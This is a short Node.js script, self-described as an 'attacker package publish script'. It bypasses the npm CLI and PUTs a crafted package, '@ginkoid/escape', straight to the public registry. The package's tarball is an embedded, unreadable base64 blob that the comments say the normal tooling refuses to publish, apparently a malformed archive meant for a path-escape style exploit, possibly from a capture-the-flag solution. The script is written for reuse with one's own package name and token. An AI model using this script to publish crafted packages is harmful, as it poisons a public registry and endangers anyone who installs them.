// attacker package publish script (npm cli cant publish it)
const https = require("https");
const crypto = require("crypto");

// use your own package name, version, and npm token
const package = "@ginkoid/escape";
const version = "0.0.0";
const token = "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa";

const req = https.request(
  {
    method: "PUT",
    hostname: "registry.npmjs.org",
    path: "/" + encodeURIComponent(package),
    headers: {
      "content-type": "application/json",
      authorization: `Bearer ${token}`,
    },
  },
  (res) => {
    const chunks = [];
    res.on("data", (chunk) => chunks.push(chunk));
    res.on("end", () => {
      console.log(res.statusCode, Buffer.concat(chunks).toString());
    });
  }
);

const tarFile =
  "H4sICA3A92AAA2dpbmtvaWQudGFyAO3QTQ7CIBAF4K49xVyAQCs/50GlZCLQZsAYby9Jk6a61UYXfJu3YEJmHueclzhzj+k64aXbgxBCSwk1e6PENhfaQNdLYZQ5GjOoTvSyDtT3XbZ5c8vFUl3Ff/jPcgqs+QfWTvXw0u+WpRMWsvSAEYODO2FxMNIUIc0RMNV2QgDG0KeJHMtnwrnkw48uapqmab7lCRq1wogACAAA";
const tarBuf = Buffer.from(tarFile, "base64");

req.end(
  JSON.stringify({
    _attachments: {
      [`${package}-${version}.tgz`]: {
        content_type: "application/octet-stream",
        data: tarFile,
        length: tarBuf.length,
      },
    },
    _id: package,
    access: null,
    "dist-tags": {
      latest: version,
    },
    name: package,
    versions: {
      [version]: {
        _id: `${package}@${version}`,
        dist: {
          shasum: crypto.createHash("sha1").update(tarBuf).digest("hex"),
          tarball: `https://registry.npmjs.org/${package}/-/${package}-${version}.tgz`,
        },
        name: package,
        version,
      },
    },
  })
);
